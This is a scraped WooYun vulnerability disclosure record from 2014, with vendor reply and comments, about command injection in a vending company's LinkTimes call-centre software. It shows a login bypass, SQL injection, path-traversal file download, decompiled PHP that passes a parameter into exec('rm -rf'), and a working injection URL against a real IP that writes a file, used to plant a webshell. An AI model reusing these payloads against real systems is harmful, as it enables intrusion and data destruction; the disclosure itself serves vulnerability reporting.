{"id": 5720, "wybug_id": "wooyun-2014-048803", "wybug_title": "友宝某业务命令执行getshell(第三方0day)", "wybug_corp": "友宝在线", "wybug_author": "s0mun5", "wybug_date": "2014-01-13 20:43", "wybug_open_date": "2014-02-27 20:43", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-27：\t细节向公众公开  简要描述： 友宝某业务使用第三方系统，结果检测过程中找到这套系统的命令执行并成功getshell友宝的这个业务，报给你们了，算谁的漏洞你自己自己商量。gay by ztz 详细说明：  在  WooYun: 友宝自动贩卖机多处高危漏洞导致主控端+内部权限泄漏  中 提到\n各位好：       现请大家马上登陆新的客服系统。           （客服电话，这个比较犀利！！）       系统网址：http://119.254.230.74:32766/agent/  （建议在IE7-IE9浏览器下使用）\n这套系统也就是友宝的电话客服系统。采用的是LinkTimes呼叫中心软件具体介绍看 http://www.lanyears.com/product.asp经过探测后发现这套系统禁用js后可以绕过验证直接看到登陆后的页面然后发现以下页面\n\n并且发现这里存在注入漏洞\n\n成功拿到账号进入呼叫中心\n\n下了一段录音听完后，确定确实是友宝的客服电话这里没有发现可以getshell的地方   漏洞证明：  http://119.254.230.74:32766/admin 是系统的后台中间有个小插曲就是 注入得到管理员账号getshell还没来得及截图结果第二天就被删了admin目录也限制权限了，管理员明文密码页加密了好管理员 赞一个 不过为了再次getshell截图 发现了新的问题http://119.254.230.74:32766/maint是后台的目录admin只是登录页面禁用js后发现直接可以浏览maint后台连注管理员密码都省了\n\nhttp://119.254.230.74:32766/maint/backupdownload.php?filename= 下载备份的链接存在任意文件下载 并且不存在的文件会曝出绝对路径\nWarning: filesize() [function.filesize]: stat failed for /var/backup/../..a/etc/passwd in /var/www/html/maint/backupdownload.php on line 5Warning: fopen(/var/backup/../..a/etc/passwd) [function.fopen]: failed to open stream: No such file or directory in /var/www/html/maint/backupdownload.php on line 8\n下载php文件发现时zend解密的，解密后进行简单审计。/maint/index.php\nswitch ( $display )    {        case \"1\" :            echo \"<h2>网络配置</h2>\";            include( \"dns.php\" );            break;        case \"2\" :            if ( $_SESSION['adminlogin'] == 1 )            {                echo \"<h2>管理员设置</h2>\";                include( \"maintuser.php\" );                break;            }        case \"3\" :            echo \"<h2>修改控制台口令</h2>\";            include( \"panelpass.php\" );            break;        case \"4\" :            echo \"<h2>修改系统时间</h2>\";            include( \"mdtime.php\" );            break;        case \"5\" :            echo \"<h2>修改记录保存时间</h2>\";            include( \"mkrecord.php\" );            break;        case \"6\" :            echo \"<h2>修改系统端口</h2>\";            include( \"changeport.php\" );            break;        case \"7\" :            include( \"backupnew.php\" );            break;        case \"8\" :            echo \"<h2>邮件设置</h2>\";            include( \"setmail.php\" );    }\n看 diaplay = 7的时候 backupnew.php\nswitch ( $action ){    case \"addednew\" :        echo \"<script>javascript:alert('请耐心等待网页刷新');</script>\";        if ( $backuptype == \"all\" )        {            exec( \"/var/backup/fullbackup.sh\" );        }        else if ( $backuptype == \"daily\" )        {            exec( \"/var/backup/dailybackup.sh\" );        }        $action = \"restore\";        break;    case \"delete\" :        $dstr = \"\";        if ( $backupvalue )        {            exec( \"/bin/rm -rf /var/backup/\".$backupvalue.\"*\" );            $dstr = \"<font color='red'>\".$backupvalue2.\"己删除</font>\";        }        $action = \"restore\";        break;    case \"restored\" :        $dstr = \"\";        echo \"<script>javascript:alert('请耐心等待网页刷新');</script>\";        if ( $backupvalue2 == \"full\" )        {            exec( \"/var/backup/fullrestore.sh \".$backupvalue );            $dstr = \"<font color='red'>\".$backupvalue.\"全备份己恢复，需要重启机器才能生效</font>\";        }        else        {            exec( \"/var/backup/dailyrestore.sh \".$backupvalue );            $dstr = \"<font color='red'>\".$backupvalue.\"日备份己恢复，需要重启机器才能生效</font>\";        }        $action = \"restore\";        break;    case \"uploadnew\" :        $dstr = \"\";        if ( is_uploaded_file( $_FILES['backupfile']['tmp_name'] ) )        {            move_uploaded_file( $_FILES['backupfile']['tmp_name'], \"/var/backup/\".$_FILES['backupfile']['name'] );            $dstr = \"<font color='red'>成功上传\".$_FILES['backupfile']['name'].\"</font>\";        }        $action = \"upload\";}\n全尼玛是exec啊，程序员是写c的么。看这里\ncase \"delete\" :        $dstr = \"\";        if ( $backupvalue )        {            exec( \"/bin/rm -rf /var/backup/\".$backupvalue.\"*\" );            $dstr = \"<font color='red'>\".$backupvalue2.\"己删除</font>\";        }        $action = \"restore\";        break;\n好了 可以执行命令了。url：http://119.254.230.74:32766/maint/index.php?display=7&action=delete&backupvalue=123%26%26echo%20xxx%20%3E/var/www/html/xxx.txt%26%26\n\n然后写shell\n\n\n\n   修复方案：  shell已经删除留下了xxx.txt你们修复后就报给厂商让他们发补丁吧还有 能不能不送饮料了 上次的还没有喝完   版权声明：转载请注明来源 s0mun5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-14 11:49 厂商回复： 感谢s0mun5牛 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-13 23:25 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  ztz    \n     2014-01-14 00:47 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  你丫又搞友宝，这回又喝了不少免费饮料吧    \n     2014-01-14 10:32 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  GAY你妹。。么么哒    \n     2014-01-14 11:58 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  我现在是光喝饮料，不吃饭的。    \n     2014-02-28 09:21 |    \t\t那一份执着 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        | 只有不断学习不断思考才能使自己进步，我不...)\t\t \n  是不是营养快线啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}